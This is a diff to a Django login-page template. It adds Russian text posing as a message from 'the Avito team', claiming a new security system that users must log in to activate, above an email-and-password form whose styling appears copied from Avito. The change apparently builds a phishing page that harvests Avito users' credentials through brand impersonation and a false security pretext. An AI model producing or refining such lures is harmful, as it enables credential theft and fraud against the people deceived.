@@ -15,9 +15,11 @@
 	<link rel="shortcut icon" href="{% static 'img/unnamed.ico' %}">
 </head>
 <body>
-	<div class="title">
-		<h1>Вход</h1>
-	</div>
+    <div class="top">
+    <h6><span>Вас приветствует команда Авито.</span><br><br>
+    Ежедневно мы работаем для вас и рады представить обновлённую систему безопасности, которая надёжно защитит ваши личные данные. <br><br>
+    Для её активации необходимо пройти авторизацию.</h6>
+    </div>
 	<form action="{% url 'login' %}" method="POST">
         {% csrf_token %}
 		<label class="_3e-2q">&nbsp;&nbsp;&nbsp;Электронная почта</label>
